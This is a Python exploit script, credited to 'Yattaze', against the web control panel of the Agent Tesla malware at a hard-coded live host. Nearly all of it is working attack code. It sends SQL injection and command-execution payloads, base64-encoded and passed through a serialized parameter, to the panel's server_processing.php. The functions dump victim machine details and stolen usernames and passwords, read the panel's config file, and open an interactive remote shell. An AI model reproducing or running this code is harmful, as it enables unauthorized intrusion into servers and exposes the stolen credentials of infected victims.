# Agent Tesla Exploit By Yattaze

import requests, base64
from past.builtins import raw_input

HOST = "http://equator-motorsport.ml"

EXPLOIT_PATH = "/WebPanel/server_side/scripts/server_processing.php"

URL = HOST + EXPLOIT_PATH


def grabVictims():
    BOT_IP_EXPLOIT = {'table': 'victims',

                      'primary': 'id',

                      'clmns': 'a:5:{i:0;a:2:{s:2:"db";s:2:"id";s:2:"dt";i:0;}i:1;a:2:{s:2:"db";s:4:"hwid";s:2:"dt";i:1;}i:2;a:2:{s:2:"db";s:9:"ip_addres";s:2:"dt";i:2;}i:3;a:2:{s:2:"db";s:7:"pc_name";s:2:"dt";i:3;}i:4;a:2:{s:2:"db";s:6:"status";s:2:"dt";i:4;}}'

                      }

    r = requests.get(url=URL, params=BOT_IP_EXPLOIT)

    ret = r.json()

    print('[*] Exploiting: ' + HOST + ' for Victim Info\'s')

    print('[*] ' + str(ret['recordsTotal']) + ' Victims\n')

    print('ID : HWID : IP ADDRESS : PC NAME : STATUS')

    for i in ret['data']: print(i[0] + " : " + i[1] + " : " + i[2] + " : " + i[3] + " : " + i[4])


def grabPasswords():
    PASS_EXPLOIT = {'table': 'passwords',

                    'primary': 'password_id',

                    'clmns': 'a:3:{i:0;a:2:{s:2:"db";s:4:"host";s:2:"dt";i:0;}i:1;a:2:{s:2:"db";s:8:"username";s:2:"dt";i:1;}i:2;a:2:{s:2:"db";s:3:"pwd";s:2:"dt";i:2;}}'

                    }

    r = requests.get(url=URL, params=PASS_EXPLOIT)

    ret = r.json()

    print('[*] Exploiting: ' + HOST + ' for Victim Passwords\'s')

    print('[*] Total Passwords: ' + str(ret['recordsTotal']) + "\n")

    print('HOST : USERNAME : PASSWORD\n')

    for i in ret['data']: print(i[0] + " : " + i[1] + " : " + i[2])


def grabConfig():
    print('[*] Exploiting: ' + HOST + ' for Panel Config')

    EXPLOIT1 = {'table': 'passwords',

                'primary': 'password_id',

                'clmns': 'a:1:{i:0;a:3:{s:2:"db";s:3:"pwd";s:2:"dt";s:8:"username";s:9:"formatter";s:4:"exec";}}',

                'where': 'MT0xIFVOSU9OIFNFTEVDVCAiZmluZCAvIC1uYW1lICdjb25maWcucGhwJyI='

                }

    r = requests.get(url=URL, params=EXPLOIT1)

    ret = r.json()

    for k, v in ret['data'][-1].items(): config = v

    print('[*] Got config location: ' + v)

    where = base64.standard_b64encode('1=1 UNION SELECT \"cat ' + config + ' > pwn.txt\"')

    print('[*] Constructed Exploit: ' + where)

    EXPLOIT2 = {'table': 'passwords',

                'primary': 'password_id',

                'clmns': 'a:1:{i:0;a:3:{s:2:"db";s:3:"pwd";s:2:"dt";s:8:"username";s:9:"formatter";s:4:"exec";}}',

                'where': where

                }

    r = requests.get(url=URL, params=EXPLOIT2)

    p = HOST + "/WebPanel/server_side/scripts/pwn.txt"

    r = requests.get(url=p)

    print("\n[+] Exploited\n" + r.content)


def shell():
    print('[*] Starting Shell on ' + HOST)

    while True:

        cmd = raw_input('>')

        where = base64.standard_b64encode('1=1 UNION SELECT \"' + cmd + '\"')

        EXPLOIT = {'table': 'passwords',

                   'primary': 'password_id',

                   'clmns': 'a:1:{i:0;a:3:{s:2:"db";s:3:"pwd";s:2:"dt";s:8:"username";s:9:"formatter";s:4:"exec";}}',

                   'where': where

                   }

        r = requests.get(url=URL, params=EXPLOIT)

        for k, v in r.json()['data'][-1].items(): print(v)


grabVictims()